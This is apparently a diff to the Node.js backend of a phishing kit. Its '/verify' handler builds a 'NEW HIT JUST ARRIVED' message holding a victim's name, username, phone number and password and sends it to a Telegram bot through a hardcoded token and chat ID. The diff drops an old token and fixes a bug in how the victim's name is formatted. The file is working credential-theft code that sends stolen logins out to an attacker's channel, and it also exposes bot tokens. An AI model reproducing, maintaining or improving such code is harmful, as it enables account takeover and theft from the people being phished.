@@ -6,9 +6,6 @@ const path = require('path')
 const bodyParser = require('body-parser')
 const axios = require('axios')
 
-//const token = '6449129893:AAGzANtG4cdEwRmgkYo5L2y0FIHmlUC_2yQ'
-//const chatId = -4237257812
-
 const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
 const chatId = 5641960649
 
@@ -45,7 +42,7 @@ app.post('/verify', async (req, res) => {
     const textMessage = [
         `NEW HIT JUST ARRIVED 🔻\n`,
 
-        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.first_name : ''}`]:[]),
+        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
         ...(userData?[`Username: ${userData.username}`]:[]),
         ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
         ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),
